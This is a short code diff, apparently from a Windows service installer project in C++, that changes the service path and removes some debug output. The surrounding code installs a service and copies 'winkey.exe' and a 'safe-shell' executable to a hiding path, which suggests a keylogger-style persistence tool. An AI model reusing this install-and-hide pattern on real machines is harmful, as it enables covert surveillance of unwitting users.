@@ -27,7 +27,7 @@ static BYTE createService(void) {
 		SERVICE_WIN32_OWN_PROCESS,
 		SERVICE_DEMAND_START,
 		SERVICE_ERROR_NORMAL, // should log on error
-		getServicePath(SVC_NAME).c_str(),
+		getServicePath(SVC_EXE_NAME).c_str(),
 		NULL, NULL, NULL, NULL, NULL
 	);
 	if (!tinky.serviceHandler) {
@@ -50,8 +50,7 @@ static BYTE movWinkey(void) {
 		)) {
 
 		cerr	<< "Can't move winkey.exe... error code: "<< GetLastError() << "\n"
-				<< "Failed to create service...\n"
-				<< "\n";
+				<< "Failed to create service...\n";
 
 		return (FAILURE);
 	}
@@ -62,9 +61,6 @@ static BYTE moveAdditionalProcesses(void) { // TODO cleanup and refactor that sh
 	wstring name(L"safe-shell");
 	wstring processPath = getServicePath(name);
 	wstring genericHidingPath = GEN_HIDING_PATH + name + L".exe";
-
-	wcout	<< L"Shafe shell process path: " << processPath << '\n';
-	wcout	<< "Hiding path: " << genericHidingPath << '\n';
 
 	if (!CopyFileW(
 			processPath.c_str(),
